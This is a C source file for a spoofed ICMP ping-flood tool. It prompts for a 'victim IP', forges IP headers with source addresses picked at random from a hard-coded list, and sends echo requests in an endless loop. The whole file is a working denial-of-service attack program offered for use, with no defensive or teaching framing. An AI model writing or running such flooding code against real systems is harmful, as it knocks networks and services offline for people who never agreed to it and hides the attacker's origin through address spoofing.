#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <errno.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>

/*
    Generic checksum algorithm
*/
unsigned short csum(unsigned short *ptr, int nbytes) {
    long sum;
    unsigned short oddbyte;
    short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;

    return (answer);
}

int main(void) {
    // Create a raw socket for ICMP
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (s == -1) {
        perror("Failed to create socket");
        exit(1);
    }

    char datagram[4096], *target_ip;
    char *spoofed_ips[] = {"10.0.0.3", "10.0.0.4", "10.0.0.5", "10.0.0.6"};
    
    target_ip = (char *)malloc(32 * sizeof(char));
    printf("Enter victim IP: ");
    scanf("%s", target_ip);

    memset(datagram, 0, 4096);

    // IP header pointer
    struct iphdr *iph = (struct iphdr *) datagram;

    // ICMP header pointer
    struct icmphdr *icmph = (struct icmphdr *) (datagram + sizeof(struct iphdr));
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr(target_ip);

    // IP Header configuration
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct icmphdr);
    iph->id = htons(12345);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_ICMP;
    iph->check = 0;
    iph->daddr = sin.sin_addr.s_addr;

    // ICMP Header configuration
    icmph->type = ICMP_ECHO; // ICMP Echo Request
    icmph->code = 0;
    icmph->un.echo.id = htons(getpid());
    icmph->un.echo.sequence = 0;
    icmph->checksum = 0;

    // IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("Error setting IP_HDRINCL");
        exit(1);
    }

    srand(time(NULL));
    printf("Starting ICMP flood...\n");

    while (1) {
        // Pick a random spoofed IP from the agent list
        char *chosen_src = spoofed_ips[rand() % 4];
        iph->saddr = inet_addr(chosen_src);
        
        // Reset sequence for variety
        icmph->un.echo.sequence = htons(rand() % 65535);
        
        // Calculate ICMP Checksum
        icmph->checksum = 0;
        icmph->checksum = csum((unsigned short *)icmph, sizeof(struct icmphdr));

        // Calculate IP Checksum
        iph->check = 0;
        iph->check = csum((unsigned short *)datagram, iph->tot_len);

        // Send the packet
        if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)) < 0) {
            perror("sendto failed");
        }
    }

    return 0;
}